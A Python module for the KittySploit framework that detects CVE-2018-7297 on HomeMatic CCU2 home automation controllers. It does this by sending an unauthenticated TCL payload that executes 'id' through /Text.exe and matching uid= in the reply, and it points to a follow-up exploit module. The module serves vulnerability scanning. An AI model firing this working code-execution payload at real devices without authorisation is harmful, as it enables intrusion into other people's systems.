#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HomeMatic CCU2 TCL interpreter RCE (CVE-2018-7297)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HomeMatic CCU2 - TCL RCE Detection (CVE-2018-7297)',
        'description': (
            'Detects CVE-2018-7297 by POSTing system.Exec("id") TCL to /Text.exe and '
            'checking for uid= output.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'homematic', 'ccu2', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/homematic_cve_2018_7297_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-7297',
            'https://atomic111.github.io/article/homematic-ccu2-remote-code-execution',
        ],
        'cve': 'CVE-2018-7297',
    }

    def run(self):
        data = (
            'string stdout;\n'
            'string stderr;\n'
            'system.Exec("id", &stdout, &stderr);\n'
            'WriteLine(stdout);'
        )
        r = self.http_request(
            method='POST', path='/Text.exe', data=data, allow_redirects=False,
        )
        if not r:
            return False
        if re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='HomeMatic CCU2 TCL RCE (CVE-2018-7297)',
                path='/Text.exe',
            )
            return True
        return False
